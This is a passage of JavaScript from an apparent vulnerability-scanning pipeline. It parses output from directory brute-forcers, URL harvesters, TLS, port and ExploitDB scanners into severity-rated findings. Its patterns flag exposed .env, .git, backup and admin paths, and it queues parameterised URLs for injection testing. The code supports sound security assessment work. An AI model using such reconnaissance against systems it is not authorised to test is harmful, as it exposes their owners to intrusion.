        push(`feroxbuster: ${blocked.length} sensitive paths exist but are NOT accessible (HTTP 403/404)`, 'info',
          `Paths matching sensitive patterns returned blocking status codes: ${blocked.slice(0, 5).map(p => `${p.url.replace(/^https?:\/\/[^/]+/i, '')} (${p.status})`).join(', ')}${blocked.length > 5 ? '...' : ''}. These are access-controlled (WAF or server deny rules) — not an exposure.`)
      }
      const others = paths.length - interesting.length - blocked.length
      if (others > 0) push(`feroxbuster: ${others} additional paths discovered`, 'info', `Total: ${paths.length} paths`)
    }
    if (findings.length || discoveredUrls.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── dirsearch: extension-aware directory search ──
  // Format: `[12:34:56] 200 -   123B - /path - /url`
  if (tool === 'dirsearch') {
    const paths = []
    for (const line of lines) {
      const m = line.match(/\[\d{2}:\d{2}:\d{2}\]\s+(\d{3})\s+-\s+.*?-\s+(https?:\/\/\S+|\/\S+)/i)
      if (m && m[2] && m[2].length > 1) paths.push({ status: m[1], path: m[2] })
    }
    if (paths.length) {
      const base = ensureScheme(target).replace(/\/$/, '')
      for (const p of paths) {
        const url = /^https?:/i.test(p.path) ? p.path : `${base}${p.path.startsWith('/') ? '' : '/'}${p.path}`
        discoveredUrls.push(url)
        // STATUS GATE: only accessible paths (2xx/3xx/401) become findings
        if (/^(200|201|204|301|302|307|308|401)$/.test(p.status) && /admin|backup|config|\.git|\.env|\.sql|\.bak|\.zip|upload|debug/i.test(p.path)) {
          push(`dirsearch: Discovered ${p.path} (HTTP ${p.status})`, 'medium', `dirsearch discovered ${p.path} with HTTP status ${p.status}`)
        }
      }
      if (!findings.length && paths.length) {
        push(`dirsearch: ${paths.length} paths discovered`, 'info', `Paths: ${paths.slice(0, 5).map(p => p.path).join(', ')}${paths.length > 5 ? '...' : ''}`)
      }
    }
    if (findings.length || discoveredUrls.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── gau: URL harvesting from Wayback/CommonCrawl/OTX ──
  // One URL per line — historical URLs often reveal forgotten endpoints & params
  if (tool === 'gau') {
    const seen = new Set()
    let paramCount = 0
    for (const line of lines) {
      const u = line.trim()
      if (!/^https?:\/\//i.test(u) || seen.has(u)) continue
      seen.add(u)
      discoveredUrls.push(u)
      if (/\?[^=]+=/.test(u)) paramCount++
    }
    if (discoveredUrls.length) {
      push(`gau: ${discoveredUrls.length} historical URLs harvested (${paramCount} with parameters)`, 'info',
        `gau (Wayback/CommonCrawl/OTX) found ${discoveredUrls.length} archived URLs for this host. ${paramCount} carry query parameters — all queued for injection testing. Forgotten endpoints (.bak, old admin panels, debug pages) often appear only in archives.`)
      // Flag juicy archived endpoints
      const juicy = discoveredUrls.filter(u => /admin|backup|\.git|\.env|\.bak|\.sql|phpmyadmin|debug|console|test|staging/i.test(u)).slice(0, 5)
      for (const u of juicy) {
        push(`gau: Sensitive archived endpoint — ${u.slice(0, 120)}`, 'medium', `Historical URL: ${u}`, { url: u })
      }
    }
    if (findings.length || discoveredUrls.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── sslscan: TLS/SSL cipher and protocol audit ──
  if (tool === 'sslscan') {
    const weakProtocols = lines.filter(l => /^\s*(SSLv2|SSLv3|TLSv1\.0|TLSv1\.1)\s/i.test(l) && /\d{3}\s*bits|enabled/i.test(l))
    const weakCiphers = lines.filter(l => /(RC4|3DES|DES-CBC|EXP-|NULL|MD5|anon|EXPORT)/i.test(l) && /^\s*(SSL|TLS)/.test(l))
    const selfSigned = lines.find(l => /self-signed/i.test(l))
    const expired = lines.find(l => /expired/i.test(l))
    const weakSig = lines.find(l => /Signature Algorithm:\s*(sha1|md5)/i.test(l))
    if (weakProtocols.length) {
      const protos = [...new Set(weakProtocols.map(l => l.trim().match(/^(SSLv\d(?:\.\d)?|TLSv\d\.\d)/i)?.[0]))].filter(Boolean)
      push(`Weak TLS protocols enabled — ${protos.join(', ')}`, 'medium',
        `sslscan found deprecated protocols enabled: ${protos.join(', ')}. These are vulnerable to downgrade attacks (POODLE, BEAST) and are flagged by all modern scanners.`,
        { cweId: 'CWE-327', owaspCategory: 'A02:2025-Security Misconfiguration' })
    }
    if (weakCiphers.length) {
      push(`Weak TLS ciphers offered (${weakCiphers.length} cipher suites)`, 'medium',
        `sslscan found weak ciphers: ${weakCiphers.slice(0, 3).map(l => l.trim().slice(0, 60)).join(' | ')}`,
        { cweId: 'CWE-327', owaspCategory: 'A02:2025-Security Misconfiguration' })
    }
    if (selfSigned) {
      push(`Self-signed TLS certificate`, 'medium', selfSigned.trim(), { cweId: 'CWE-477', owaspCategory: 'A02:2025-Security Misconfiguration' })
    }
    if (expired) {
      push(`Expired TLS certificate`, 'high', expired.trim(), { cweId: 'CWE-298', owaspCategory: 'A02:2025-Security Misconfiguration' })
    }
    if (weakSig) {
      push(`Certificate signed with weak hash (${weakSig.match(/Signature Algorithm:\s*(\S+)/i)?.[1] || 'weak'})`, 'low', weakSig.trim(), { cweId: 'CWE-327' })
    }
    if (findings.length) return { findings: findings.slice(0, 15), discoveredUrls }
  }

  // ── masscan: full-range fast port sweep ──
  // Format: `Discovered open port 22/tcp on 192.168.1.1`
  if (tool === 'masscan') {
    const risky = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 445: 'SMB', 3389: 'RDP', 3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis', 27017: 'MongoDB', 9200: 'Elasticsearch', 1433: 'MSSQL', 5900: 'VNC', 11211: 'Memcached' }
    const seen = new Set()
    for (const line of lines) {
      const m = line.match(/Discovered open port\s+(\d+)\/(tcp|udp)\s+on\s+(\S+)/i)
      if (!m) continue
      const key = `${m[3]}:${m[1]}`
      if (seen.has(key)) continue
      seen.add(key)
      const port = parseInt(m[1])
      const isRisky = risky[port]
      push(`masscan: Open port ${port}/${m[2]} on ${m[3]}${isRisky ? ` [${isRisky}]` : ''}`,
        isRisky ? 'medium' : 'info', line.trim(), { port, service: isRisky || 'unknown' })
    }
    if (findings.length) return { findings: findings.slice(0, 40), discoveredUrls }
  }

  // ── searchsploit: ExploitDB search ──
  // Format: `Apache 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.py`
  if (tool === 'searchsploit') {
    for (const line of lines) {
      const m = line.match(/^(.+?)\s*\|\s*(\w+\/\w+\/\d+\.?\w*)$/)
      if (!m) continue
      const title = m[1].trim()
      if (!title || /exploit\s*title|^-{5,}|searchsploit/i.test(title)) continue
      const sev = /rce|remote code|execute|shell|root|privilege esc/i.test(title) ? 'high'
        : /sql|injection|bypass|csrf|xss|traversal|lfi|rfi/i.test(title) ? 'medium' : 'low'
      push(`searchsploit: ${title.slice(0, 120)}`, sev,
        `ExploitDB match: ${title} (${m[2]}) — a public exploit exists for a component on this target.`,
        { cweId: /sql/i.test(title) ? 'CWE-89' : /xss/i.test(title) ? 'CWE-79' : null })
    }
    if (findings.length) return { findings: findings.slice(0, 20), discoveredUrls }
  }

  // Keyword heuristics for non-tagged output — but only on lines that look like findings,
  // never from tool banner/info logs. Requires the vulnerability keyword AND a host/url/parameter context.
  // NEGATIVE regex defined above (shared with severity-tagged section)
  const text = output.toLowerCase()
  const KW = [
    [/sql injection|sqli|injectable parameter|is vulnerable to sql/, 'SQL Injection', 'high'],
    [/xss|cross-site scripting|reflected .*(script|xss)/, 'Cross-Site Scripting (XSS)', 'medium'],
    [/ssrf|server-side request forgery/, 'Server-Side Request Forgery', 'high'],
    [/command injection|remote code execution|\brce\b/, 'Command Injection / RCE', 'critical'],
    [/directory traversal|path traversal|lfi|local file inclusion/, 'Path Traversal / LFI', 'high'],
    [/open redirect/, 'Open Redirect', 'medium'],
    [/default (credentials|password)|weak password/, 'Weak / Default Credentials', 'high'],
    [/cve-\d{4}-\d+/, 'Known Vulnerable Component', 'high'],
    [/directory listing|index of \//, 'Directory Listing Enabled', 'low'],
    [/expired|self-signed|weak cipher/, 'TLS/SSL Configuration Issue', 'medium'],
  ]
  const seen = new Set()
  for (const [re, title, sev] of KW) {
    if (re.test(text) && !seen.has(title)) {
      // Find a line containing the keyword that is NOT chatter and NOT negative
      const evLine = lines.find(l => re.test(l.toLowerCase()) && !CHATTER.test(l) && !NEGATIVE.test(l))
      if (!evLine) continue
      push(title, sev, evLine)
      seen.add(title)
    }
  }
  return { findings: findings.slice(0, 30), discoveredUrls }
}

export default UnifiedPipeline
